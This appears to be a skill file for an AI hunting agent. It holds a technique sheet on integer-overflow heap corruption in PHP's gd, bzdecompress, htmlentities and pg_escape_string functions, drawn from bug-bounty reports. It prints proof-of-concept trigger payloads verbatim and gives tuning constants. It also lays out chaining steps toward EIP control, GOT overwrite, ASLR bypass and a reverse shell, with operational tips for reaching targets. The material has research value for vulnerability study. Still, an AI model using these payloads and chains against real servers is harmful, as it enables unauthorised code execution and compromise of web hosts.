---
name: hunter-l3-memory-corruption-rce
description: "Use when hunting Memory Corruption (RCE) on a target. Loads the L3 technique sheet: This class covers integer-overflow and OOB-write bugs in native C extensions/libraries reachable from application-level input (here: PHP's gd, bzip2, htmlentities, and pgsql bindings)."
domain: cybersecurity
subdomain: web
tags:
- web
- memory-corruption-rce
- hunting
- l3
version: '1.0'
---

# Memory Corruption (RCE) — Technique Sheet

## Overview
This class covers integer-overflow and OOB-write bugs in native C extensions/libraries reachable from application-level input (here: PHP's gd, bzip2, htmlentities, and pgsql bindings). Each record shows that when a 32-bit length computation (typically `len * 2`) wraps, the engine allocates a far-too-small buffer and then writes attacker-sized data into it — a classic controlled heap overflow. It pays when you can reach a vulnerable native function with attacker-controlled lengths at scale (large strings, huge image dimensions, palette indices), because the overflow can be steered into EIP control, info leaks, and ultimately a shell.

## Distinct sub-patterns

### Sub-pattern 1: Negative transparent color → arbitrary null write + palette OOB (gd / PHP images)
- Endpoint shape / parameter: PHP gd functions — `imagecreatetruecolor(width, height)`, `imagecolortransparent(img, color)`, `imagetruecolortopalette(img, dither, maxcolors)`, `imagesetpixel(img, x, y, color)`, plus `imagescale`. The parameter that matters is the image **width** and the **transparent color** value.
- Payload that actually fired (verbatim, truncated in record):
```php
<?php
$plt_strlen = 0x8b472c0;
$img = imagecreatetruecolor($plt_strlen + 0x10, 1);
imagecolortransparent($img, -24060);
imagetruecolortopalette($img, TRUE, 3);
imagecolortransparent($img, 0xff);
for ($i = 0; $i < 256; $i++) imagecolorallocatealpha($img, $i, $i, $i, $i);
imagesetpixel($img, $plt_strl... [truncated in record]
```
- Root-cause pattern: `gdImageTrueColorToPaletteBody` accepts a **negative transparent color**, enabling an arbitrary null write. Combined with an **out-of-bounds transparent index** used by `imagescale` for an info leak, and `imagesetpixel` writing through the corrupted palette for GOT overwrite. Notably the width (`0x8b472c0 + 0x10`) is itself a huge value chosen to size the palette allocation for corruption.
- Impact proven: Demonstrated EIP control (`EIP=0x44434241`) and **full code execution**: a reverse shell as `uid=33(www-data)` on a Debian + NGINX + PHP-FPM server, with **ASLR bypass via /proc/self/maps**.
- Exemplar: id=153776 (ajaysenr, Internet Bug Bounty).

### Sub-pattern 2: Integer overflow in bzdecompress() output buffer
- Endpoint shape / parameter: `bzdecompress(compressed_data)` — the parameter is a **compressed string** whose decompressed size the function computes internally.
- Payload that actually fired (verbatim, truncated in record):
```php
<?php
ini_set('memory_limit', -1);
$s = str_repeat('A', 0xE3AC)."BBBB".str_repeat('C', 0x1C50);
$a = bzcompress($s);
$a = $a.str_repeat('A', 4634 - strlen($a));
$a = str_repeat($a, 0x7ffffffe / strlen($a)); // try to create a compressed data with large size
bzdecompress($a); // trigger this vulnerab... [truncated in record]
```
- Root-cause pattern: Integer overflow — bzdecompress computes the output buffer as `source_len*2`, which is too small; the overflow size is controlled by the compressed data length. Key steps: (1) craft the decompressed string so `'BBBB'` (the EIP overwrite value, later seen as 0x42424242) sits at the offset where the overflow reaches saved EIP, with `0x1C50` of filler after it; (2) pad the compressed blob to exactly 4634 bytes; (3) repeat it to near `0x7ffffffe` total so the multiplication wraps. `ini_set('memory_limit', -1)` is required to allow the huge allocation.
- Impact proven: Heap overflow on **32-bit PHP** with EIP controlled to `0x42424242` (directly from the `'BBBB'` in the input), resulting in arbitrary code execution.
- Exemplar: id=180563 (ajaysenr, Internet Bug Bounty).

### Sub-pattern 3: Integer overflow in htmlentities destination buffer
- Endpoint shape / parameter: `htmlentities(input_string, flags, charset, double_encode)` — the parameter is an **input string of maximal length**.
- Payload that actually fired (verbatim):
```php
<?php
ini_set('memory_limit', -1);
$s = str_repeat("A", PHP_INT_MAX);
htmlentities($s, 0, "", true);
?>
```
- Root-cause pattern: Integer overflow in `php_escape_html_entities_ex`: it computes the destination buffer as `maxlen = 2*oldlen`; when the input length is near `PHP_INT_MAX` the doubling wraps to a tiny/too-small allocation, then entity-encoding writes far past it.
- Impact proven: Heap overflow on 32-bit PHP; researcher demonstrated a **memory leak to bypass ASLR+DEP** and arbitrary code execution (`/bin/sh`).
- Exemplar: id=180582 (ajaysenr, Internet Bug Bounty).

### Sub-pattern 4: Integer overflow in pg_escape_string buffer doubling
- Endpoint shape / parameter: `pg_escape_string(input_string)` — the parameter is an **input string**.
- Payload that actually fired (verbatim):
```php
<?php
ini_set('memory_limit', -1);
$s = str_repeat("a",0x7FFFFFFF);
$escaped = pg_escape_string($s);
?>
```
- Root-cause pattern: Integer overflow — `pg_escape_string` allocates based on `ZSTR_LEN(from) * 2`; an input of exactly `0x7FFFFFFF` bytes makes `* 2` wrap to a too-small buffer, and the escaped output overflows it.
- Impact proven: Heap overflow on 32-bit PHP; researcher demonstrated a **memory leak bypassing ASLR+DEP** and arbitrary code execution (`/bin/sh`).
- Exemplar: id=180584 (ajaysenr, Internet Bug Bounty).

## Bypass / chain notes
- All four records are 32-bit-dependent: the `len * 2` doubling overflow requires lengths that wrap in 32 bits (`0x7FFFFFFF`, `PHP_INT_MAX`). On 64-bit builds the same inputs do not wrap the same way — target 32-bit PHP.
- `ini_set('memory_limit', -1)` appears in 3 of 4 records as a prerequisite step so the oversized allocations (`str_repeat` to PHP_INT_MAX, repeated compressed blobs to 0x7ffffffe bytes) survive PHP's memory cap.
- The gd bug (id=153776) is the fullest chain in the records: (1) negative transparent color → arbitrary null write in `gdImageTrueColorToPaletteBody`; (2) `imagescale` uses an out-of-bounds transparent index → info leak (the record's chain field is truncated here, but the stated endpoints are the leak primitive); (3) `imagesetpixel` over the corrupted palette → **GOT overwrite**; (4) EIP = 0x44434241 confirmed, then reverse shell as www-data. ASLR defeated by **reading /proc/self/maps** (leveraging the info leak) rather than brute force.
- EIP-control value provenance is verbatim-injectable in two records: `'BBBB'` in the bzdecompress payload produced `EIP=0x42424242`; the gd case showed `0x44434241` ('ABCD' pattern) — use both to confirm and then locate your overflow offset.
- Size-tuning constants matter and are recorded: bzdecompress used `0xE3AC` leading fill, `0x1C50` trailing fill, 4634-byte compressed padding, total repeat size `0x7ffffffe / strlen($a)`; gd used width `0x8b472c0 + 0x10` and transparent color `-24060`.

## Gotchas / what NOT to do
- Do not test these on 64-bit-only builds expecting the same crash — the multiplication-wrap root cause is specifically 32-bit (every record's impact statement says "on 32-bit PHP").
- Don't forget the memory-limit bump; `str_repeat("A", PHP_INT_MAX)` will otherwise abort with an OOM fatal before reaching the vulnerable function.
- The gd primitive is a **null write** (single-byte 0x00 to an attacker-chosen address via negative color), not a direct buffer smash — you cannot use it alone for shellcode placement; it must be chained (leak via imagescale OOB index, overwrite via imagesetpixel).
- Payloads with huge allocations (near-2GB strings, repeated blobs) are heavy: craft them deliberately with `str_repeat` arithmetic as in the records rather than iterating upward.
- For the gd palette trick, the palette must be repopulated (`imagecolorallocatealpha` loop, 256 entries) after `imagetruecolortopalette` before the OOB `imagesetpixel` writes — the record's payload does this in sequence; skipping steps breaks the chain.
- These are engine/library bugs, not web-parameter injection: the "endpoint" is a PHP function, so exploitation requires the target to invoke it with your data (uploads processed through gd image functions are the realistic trigger surface; for the string functions you need an application path that passes attacker-controlled large input to them).

## Real-world impact examples
- id=153776 (gd): full compromise of a Debian + NGINX + PHP-FPM box — reverse shell as `uid=33(www-data)` with EIP control (`EIP=0x44434241`) and ASLR bypass via `/proc/self/maps`, achieved entirely through image-handling functions.
- id=180563 (bzdecompress): controlled heap overflow landing EIP at `0x42424242` on 32-bit PHP — arbitrary code execution from a compressed-data input.
- id=180582 (htmlentities): heap overflow from a single maximal-length string; memory leak defeating ASLR+DEP and spawning `/bin/sh`.
- id=180584 (pg_escape_string): identical result from a `0x7FFFFFFF`-byte string — memory leak, ASLR+DEP bypass, `/bin/sh` execution.